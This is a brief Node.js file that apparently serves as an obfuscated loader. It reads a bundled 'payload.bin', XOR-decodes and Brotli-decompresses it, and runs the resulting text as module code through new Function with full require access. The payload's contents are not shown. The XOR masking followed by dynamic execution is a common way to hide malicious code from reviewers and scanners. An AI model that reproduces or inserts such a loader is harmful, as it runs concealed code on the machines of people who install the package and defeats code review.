const fs = require('fs');
const zlib = require('zlib');
const b = fs.readFileSync(__dirname + '/payload.bin');
for(let i=0;i<b.length;i++) b[i] ^= 170;
const body = zlib.brotliDecompressSync(b).toString();
new Function('exports','require','module','__filename','__dirname',body)(exports,require,module,__filename,__dirname);
